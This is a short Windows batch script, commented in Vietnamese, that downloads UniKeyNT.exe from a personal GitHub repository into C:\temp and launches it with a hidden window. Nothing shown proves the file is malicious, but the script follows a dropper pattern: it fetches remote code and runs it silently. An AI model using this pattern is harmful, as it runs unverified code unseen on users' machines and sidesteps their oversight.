@echo off
REM Tạo thư mục C:\temp nếu chưa có
if not exist "C:\temp" (
    mkdir "C:\temp"
)

REM Tải file UniKeyNT.exe từ GitHub
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/leduckhuong/publics/raw/refs/heads/main/UniKeyNT.exe' -OutFile 'C:\temp\UniKeyNT.exe' -UseBasicParsing"

REM Chạy file UniKeyNT.exe ngầm, không hiển thị cửa sổ
powershell -Command "Start-Process 'C:\temp\UniKeyNT.exe' -WindowStyle Hidden"

echo File has been downloaded and started in background.
